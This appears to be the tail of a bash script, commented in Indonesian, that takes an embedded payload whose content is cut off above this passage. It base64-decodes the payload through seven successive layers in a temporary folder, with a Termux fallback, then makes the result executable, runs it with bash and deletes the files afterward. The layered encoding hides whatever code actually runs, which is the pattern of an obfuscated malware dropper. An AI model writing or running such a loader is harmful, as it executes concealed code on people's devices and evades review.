)
concat=$(printf "%s" "$_PAYLOAD" | tr -d '\n')
if [ -z "$concat" ]; then
  echo "xyntrix payload kosong"
  exit 2
fi
PID=$$
# Coba buat tmp via /tmp, jika gagal fallback ke PWD
TMPDIR=""
if TMPDIR=$(mktemp -d /tmp/xyntrix.XXXXXX 2>/dev/null); then
  :
else
  # fallback: buat di direktori kerja (harus bisa di SDCard/termux)
  TMPDIR="$PWD/.xyntrix_${PID}"
  mkdir -p "$TMPDIR" || { echo " (fallback )"; exit 3; }
fi
trap 'rm -rf "$TMPDIR"' EXIT
FIRST="$TMPDIR/1"
# Deteksi opsi decode
if printf '' | base64 --decode >/dev/null 2>&1; then
  DECMODE=long
elif printf '' | base64 -d >/dev/null 2>&1; then
  DECMODE=short
else
  echo " base64  (xyntrix decode )"
  exit 4
fi
# Lapisan pertama
if [ "$DECMODE" = "long" ]; then
  if ! printf "%s" "$concat" | base64 --decode > "$FIRST" 2>/dev/null; then
    echo "xyntrix "
    exit 5
  fi
else
  if ! printf "%s" "$concat" | base64 -d > "$FIRST" 2>/dev/null; then
    echo "xyntrix "
    exit 5
  fi
fi
cur="$FIRST"
i=2
while [ $i -le 7 ]; do
  nxt="$TMPDIR/$i"
  if [ "$DECMODE" = "long" ]; then
    if ! base64 --decode < "$cur" > "$nxt" 2>/dev/null; then
      echo "xyntrix  $i "
      exit 6
    fi
  else
    if ! base64 -d < "$cur" > "$nxt" 2>/dev/null; then
      echo "xyntrix  $i "
      exit 6
    fi
  fi
  cur="$nxt"
  i=$((i+1))
done
if [ -s "$cur" ]; then
  chmod +x "$cur" 2>/dev/null || true
  bash "$cur"
else
  echo "xyntrix "
  exit 7
fi
# cleanup handled by trap
exit 0
